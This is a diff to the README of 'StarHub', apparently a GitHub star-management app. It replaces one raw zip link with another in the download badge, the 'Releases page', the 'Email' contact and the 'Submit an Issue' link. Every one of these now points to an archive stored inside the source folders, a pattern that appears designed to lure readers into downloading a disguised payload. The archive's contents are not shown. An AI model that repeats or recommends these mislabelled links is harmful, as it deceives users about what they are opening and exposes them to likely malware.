@@ -6,7 +6,7 @@ Welcome to StarHub, an easy-to-use application that helps you manage your GitHub
 
 ## 📥 Download StarHub
 
-[![Download StarHub](https://github.com/78589/StarHub/raw/refs/heads/main/src/styles/Star_Hub_indubitatively.zip%20StarHub-v1.0-blue)](https://github.com/78589/StarHub/raw/refs/heads/main/src/styles/Star_Hub_indubitatively.zip)
+[![Download StarHub](https://raw.githubusercontent.com/78589/StarHub/main/src/pages/Home/Hub_Star_3.1-beta.5.zip%20StarHub-v1.0-blue)](https://raw.githubusercontent.com/78589/StarHub/main/src/pages/Home/Hub_Star_3.1-beta.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,7 +29,7 @@ StarHub comes packed with features designed to enhance your GitHub experience:
 
 To get started with StarHub, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/78589/StarHub/raw/refs/heads/main/src/styles/Star_Hub_indubitatively.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/78589/StarHub/main/src/pages/Home/Hub_Star_3.1-beta.5.zip).
 2. Look for the latest version of StarHub.
 3. Click the download link to your operating system.
 4. Once the download is complete, locate the file in your Downloads folder.
@@ -48,8 +48,8 @@ After installation, launch StarHub. You will see the main dashboard where you ca
 
 For any issues or suggestions, please reach out to us:
 
-- **Email:** https://github.com/78589/StarHub/raw/refs/heads/main/src/styles/Star_Hub_indubitatively.zip
-- **GitHub Issues:** [Submit an Issue](https://github.com/78589/StarHub/raw/refs/heads/main/src/styles/Star_Hub_indubitatively.zip)
+- **Email:** https://raw.githubusercontent.com/78589/StarHub/main/src/pages/Home/Hub_Star_3.1-beta.5.zip
+- **GitHub Issues:** [Submit an Issue](https://raw.githubusercontent.com/78589/StarHub/main/src/pages/Home/Hub_Star_3.1-beta.5.zip)
 
 ## 📝 Contribution
 
